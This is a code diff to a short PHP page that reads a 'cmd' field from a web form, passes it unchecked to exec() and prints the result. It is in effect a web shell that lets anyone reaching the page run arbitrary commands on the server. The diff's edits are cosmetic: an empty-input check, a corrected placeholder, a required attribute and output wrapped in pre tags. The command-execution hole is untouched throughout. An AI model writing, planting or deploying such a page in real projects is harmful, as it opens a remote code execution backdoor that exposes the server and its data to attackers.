@@ -1,7 +1,7 @@
 <?php
 $output = [];
-if(isset($_POST['cmd'])): 
-    
+if(isset($_POST['cmd']) && !empty($_POST['cmd'])): 
+
     $cmd = $_POST['cmd'];
 
     exec($cmd, $output);
@@ -18,14 +18,16 @@ endif;
 </head>
 <body>
     <form action="" method="post">
-        <input type="text" name="cmd" placeholder="commande line">
+        <input type="text" name="cmd" placeholder="command-line" required>
         <button type="submit">Execute</button>
     </form>
     <hr>
-    <?php 
-        foreach($output as $line):
-            echo $line."<br/>";
-        endforeach;
-    ?> 
+<pre> 
+<?php 
+foreach($output as $line): 
+    echo $line."<br>"; 
+endforeach; 
+?> 
+</pre>
 </body>
 </html>
